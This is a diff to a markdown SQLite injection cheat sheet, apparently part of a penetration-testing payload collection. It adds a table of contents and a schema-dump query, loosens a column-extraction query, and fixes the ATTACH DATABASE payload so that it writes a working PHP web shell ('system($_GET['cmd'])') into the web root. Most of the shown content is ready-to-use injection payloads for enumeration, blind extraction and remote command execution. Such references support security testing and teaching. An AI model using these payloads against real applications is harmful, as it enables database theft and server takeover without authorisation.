@@ -1,5 +1,19 @@
 # SQLite Injection
 
+## Summary
+
+* [SQLite comments](#sqlite-comments)
+* [SQLite version](#sqlite-version)
+* [String based - Extract database structure](#string-based---extract-database-structure)
+* [Integer/String based - Extract table name](#integerstring-based---extract-table-name)
+* [Integer/String based - Extract column name](#integerstring-based---extract-column-name)
+* [Boolean - Count number of tables](#boolean---count-number-of-tables)
+* [Boolean - Enumerating table name](#boolean---enumerating-table-name)
+* [Boolean - Extract info](#boolean---extract-info)
+* [Time based](#time-based)
+* [Remote Command Execution using SQLite command - Attach Database](#remote-command-execution-using-sqlite-command---attach-database)
+* [Remote Command Execution using SQLite command - Load_extension](#remote-command-execution-using-sqlite-command---load_extension)
+* [References](#references)
 ## SQLite comments
 
 ```sql
@@ -13,6 +27,12 @@
 select sqlite_version();
 ```
 
+## String based - Extract database structure
+
+```sql
+SELECT sql FROM sqlite_schema
+```
+
 ## Integer/String based - Extract table name
 
 ```sql
@@ -24,7 +44,7 @@ Use limit X+1 offset X, to extract all tables.
 ## Integer/String based - Extract column name
 
 ```sql
-SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
+SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
 ```
 
 For a clean output
@@ -62,7 +82,7 @@ AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
 ```sql
 ATTACH DATABASE '/var/www/lol.php' AS lol;
 CREATE TABLE lol.pwn (dataz text);
-INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--
+INSERT INTO lol.pwn (dataz) VALUES ('<?php system($_GET['cmd']); ?>');--
 ```
 
 ## Remote Command Execution using SQLite command - Load_extension
@@ -75,4 +95,4 @@ Note: By default this component is disabled
 
 ## References
 
-[Injecting SQLite database based application - Manish Kishan Tanwar](https://www.exploit-db.com/docs/41397.pdf)
+[Injecting SQLite database based application - Manish Kishan Tanwar](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
